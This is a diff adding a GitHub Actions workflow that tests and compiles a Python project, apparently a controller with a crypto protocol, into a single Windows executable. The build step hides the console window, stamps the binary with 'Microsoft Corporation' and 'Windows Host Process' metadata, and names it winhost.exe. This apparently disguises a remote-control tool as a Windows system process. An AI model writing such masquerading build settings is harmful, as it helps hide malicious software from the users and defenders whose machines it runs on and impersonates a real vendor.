@@ -1,0 +1,45 @@
+name: build
+
+on:
+  push:
+  pull_request:
+  workflow_dispatch:
+
+jobs:
+  test:
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+      - name: crypto + protocol tests
+        run: python tests/test_crypto.py
+      - name: compile check
+        run: python -m py_compile x.pyw controller.py web.py build_dist.py
+
+  exe:
+    needs: test
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+      - name: install nuitka
+        run: pip install nuitka ordered-set zstandard
+      - name: build
+        run: >
+          python -m nuitka
+          --onefile --windows-disable-console
+          --company-name="Microsoft Corporation"
+          --product-name="Windows Host Process"
+          --file-description="Windows Host Process"
+          --file-version=1.0.0.0 --product-version=1.0.0.0
+          --python-flag=no_site,no_asserts,no_docstrings,no_warnings
+          --lto=yes --assume-yes-for-downloads
+          --output-filename=winhost.exe x.pyw
+      - uses: actions/upload-artifact@v4
+        with:
+          name: winhost-exe
+          path: winhost.exe
